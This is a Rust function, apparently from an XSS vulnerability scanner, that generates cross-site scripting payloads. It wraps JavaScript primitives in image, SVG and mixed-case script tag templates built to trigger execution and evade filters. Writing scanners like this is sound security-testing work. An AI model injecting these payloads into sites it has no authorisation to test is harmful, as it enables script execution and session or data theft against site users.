/// Dynamically build HTML payloads by combining base templates with JavaScript execution
/// primitives from XSS_JAVASCRIPT_PAYLOADS.
/// This replaces the previous static XSS_HTML_PAYLOADS constant to ensure automatic synchronization
/// when JavaScript payload list changes.
pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
    let templates = [
        // CLASS
        "<IMG src=x onerror={JS} class=dalfox>",
        "<sVg onload={JS} class=dalfox>",
        "<sCrIpt/class=dalfox>{JS}</scRipT>",
        // ID
        "<IMG src=x onerror={JS} id=dalfox>",
        "<sVg onload={JS} id=dalfox>",
        "<sCrIpt/id=dalfox>{JS}</scRipT>",
    ];
    let mut out = Vec::new();
    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
        for tmpl in templates.iter() {
            out.push(tmpl.replace("{JS}", js));
        }
    }
    out
}
